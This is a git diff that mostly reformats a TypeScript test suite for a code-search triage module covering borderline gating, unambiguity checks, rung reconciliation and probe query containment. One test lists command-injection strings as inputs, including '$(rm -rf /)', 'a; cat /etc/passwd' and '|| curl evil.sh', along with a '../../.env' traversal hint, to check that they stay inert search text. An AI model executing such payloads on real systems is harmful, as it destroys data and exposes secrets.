@@ -71,38 +71,84 @@ describe('isBorderline (band + eligibility gating)', () => {
   it('always probes needs_clarification regardless of confidence', () => {
     for (const c of [0.01, 0.5, 0.99]) {
       expect(
-        isBorderline(parsed('needs_clarification', c), THRESHOLD, DEFAULT_RETRIEVAL_BAND),
+        isBorderline(
+          parsed('needs_clarification', c),
+          THRESHOLD,
+          DEFAULT_RETRIEVAL_BAND,
+        ),
       ).toBe(true);
     }
   });
 
   it('probes patchable only inside the band [0.55, 0.85]', () => {
-    expect(isBorderline(parsed('patchable', 0.6), THRESHOLD, DEFAULT_RETRIEVAL_BAND)).toBe(true);
-    expect(isBorderline(parsed('patchable', 0.85), THRESHOLD, DEFAULT_RETRIEVAL_BAND)).toBe(true);
+    expect(
+      isBorderline(parsed('patchable', 0.6), THRESHOLD, DEFAULT_RETRIEVAL_BAND),
+    ).toBe(true);
+    expect(
+      isBorderline(
+        parsed('patchable', 0.85),
+        THRESHOLD,
+        DEFAULT_RETRIEVAL_BAND,
+      ),
+    ).toBe(true);
     // Confidently patchable above the band is "obviously settled" — no probe.
-    expect(isBorderline(parsed('patchable', 0.95), THRESHOLD, DEFAULT_RETRIEVAL_BAND)).toBe(false);
-    expect(isBorderline(parsed('patchable', 0.54), THRESHOLD, DEFAULT_RETRIEVAL_BAND)).toBe(false);
+    expect(
+      isBorderline(
+        parsed('patchable', 0.95),
+        THRESHOLD,
+        DEFAULT_RETRIEVAL_BAND,
+      ),
+    ).toBe(false);
+    expect(
+      isBorderline(
+        parsed('patchable', 0.54),
+        THRESHOLD,
+        DEFAULT_RETRIEVAL_BAND,
+      ),
+    ).toBe(false);
   });
 
   it('probes needs_human only inside the band (Decision A eligibility)', () => {
     // needs_human is now eligible (it may rise one rung) — but only when the
     // model is not confidently settled on it.
-    expect(isBorderline(parsed('needs_human', 0.7), THRESHOLD, DEFAULT_RETRIEVAL_BAND)).toBe(true);
-    expect(isBorderline(parsed('needs_human', 0.99), THRESHOLD, DEFAULT_RETRIEVAL_BAND)).toBe(false);
+    expect(
+      isBorderline(
+        parsed('needs_human', 0.7),
+        THRESHOLD,
+        DEFAULT_RETRIEVAL_BAND,
+      ),
+    ).toBe(true);
+    expect(
+      isBorderline(
+        parsed('needs_human', 0.99),
+        THRESHOLD,
+        DEFAULT_RETRIEVAL_BAND,
+      ),
+    ).toBe(false);
   });
 });
 
 describe('isUnambiguous', () => {
   it('true only for single-file, >=1 and <=N matches, not truncated', () => {
     expect(isUnambiguous(unambiguousProbe('src/a.ts', 1))).toBe(true);
-    expect(isUnambiguous(unambiguousProbe('src/a.ts', DEFAULT_MAX_UNAMBIGUOUS_MATCHES))).toBe(true);
+    expect(
+      isUnambiguous(
+        unambiguousProbe('src/a.ts', DEFAULT_MAX_UNAMBIGUOUS_MATCHES),
+      ),
+    ).toBe(true);
   });
 
   it('false for multi-file, zero-match, too-many, or truncated', () => {
     expect(isUnambiguous(multiFileProbe())).toBe(false);
     expect(isUnambiguous(zeroMatchProbe())).toBe(false);
-    expect(isUnambiguous(unambiguousProbe('src/a.ts', DEFAULT_MAX_UNAMBIGUOUS_MATCHES + 1))).toBe(false);
-    expect(isUnambiguous({ ...unambiguousProbe(), truncated: true })).toBe(false);
+    expect(
+      isUnambiguous(
+        unambiguousProbe('src/a.ts', DEFAULT_MAX_UNAMBIGUOUS_MATCHES + 1),
+      ),
+    ).toBe(false);
+    expect(isUnambiguous({ ...unambiguousProbe(), truncated: true })).toBe(
+      false,
+    );
   });
 });
 
@@ -159,7 +205,11 @@ describe('reconcile — one-rung UP under strict unambiguity', () => {
   });
 
   it('vetoes an up-move on ambiguous / zero / truncated evidence', () => {
-    for (const probe of [multiFileProbe(), zeroMatchProbe(), { ...unambiguousProbe(), truncated: true }]) {
+    for (const probe of [
+      multiFileProbe(),
+      zeroMatchProbe(),
+      { ...unambiguousProbe(), truncated: true },
+    ]) {
       const out = reconcile(
         parsed('needs_clarification', 0.6),
         parsed('patchable', 0.9),
@@ -174,7 +224,11 @@ describe('reconcile — one-rung cap PROPERTY test', () => {
   it('for every (from, modelSuggested) pair the result is never > one rung above from', () => {
     for (const from of ALL) {
       for (const suggested of ALL) {
-        for (const probe of [unambiguousProbe(), multiFileProbe(), zeroMatchProbe()]) {
+        for (const probe of [
+          unambiguousProbe(),
+          multiFileProbe(),
+          zeroMatchProbe(),
+        ]) {
           const out = reconcile(
             parsed(from, 0.7),
             parsed(suggested, 0.9),
@@ -203,14 +257,21 @@ describe('deriveProbeQueries — INPUT containment', () => {
 
   it('uses a validated sourceHint file path and drops an invalid one', () => {
     expect(
-      deriveProbeQueries('x', { sourceHint: 'src/components/OrderForm.tsx:42' }),
+      deriveProbeQueries('x', {
+        sourceHint: 'src/components/OrderForm.tsx:42',
+      }),
     ).toContain('src/components/OrderForm.tsx');
     // Traversal / dotfile hints are rejected by parseSourceHint ⇒ not a query.
     expect(deriveProbeQueries('x', { sourceHint: '../../.env:1' })).toEqual([]);
   });
 
   it('treats shell-metacharacter text as a literal search string (never executed)', () => {
-    for (const hostile of ['$(rm -rf /)', 'a; cat /etc/passwd', '`id`', '|| curl evil.sh']) {
+    for (const hostile of [
+      '$(rm -rf /)',
+      'a; cat /etc/passwd',
+      '`id`',
+      '|| curl evil.sh',
+    ]) {
       const queries = deriveProbeQueries(`problem here`, { text: hostile });
       // The hostile string is passed through verbatim as a plain query — it is
       // a search term, not a command. (The probe never shells out; see
@@ -230,14 +291,18 @@ describe('deriveProbeQueries — INPUT containment', () => {
     expect(deriveProbeQueries(`'the' 'ab' 'button'`, {})).toEqual([]);
 
     // Case-insensitive dedupe: element text and quote differ only by case.
-    const deduped = deriveProbeQueries(`'Save Changes'`, { text: 'save changes' });
+    const deduped = deriveProbeQueries(`'Save Changes'`, {
+      text: 'save changes',
+    });
     expect(deduped.length).toBe(1);
   });
 });
 
 describe('renderProbeEvidence — OUTPUT containment (Decision B)', () => {
   it('emits paths + counts only, referencing queries by index (no query text, no contents)', () => {
-    const evidence = renderProbeEvidence(unambiguousProbe('src/components/Header.tsx', 2));
+    const evidence = renderProbeEvidence(
+      unambiguousProbe('src/components/Header.tsx', 2),
+    );
     expect(evidence).toContain('src/components/Header.tsx • 2');
     expect(evidence).toContain('distinctFiles=1');
     expect(evidence).toContain('totalMatches=2');
@@ -247,7 +312,10 @@ describe('renderProbeEvidence — OUTPUT containment (Decision B)', () => {
   });
 
   it('caps the number of listed files', () => {
-    const files = Array.from({ length: 50 }, (_, i) => ({ path: `src/f${i}.ts`, count: 1 }));
+    const files = Array.from({ length: 50 }, (_, i) => ({
+      path: `src/f${i}.ts`,
+      count: 1,
+    }));
     const probe: ProbeResult = {
       perQuery: [{ query: 'q', files }],
       distinctFiles: files.map((f) => f.path),
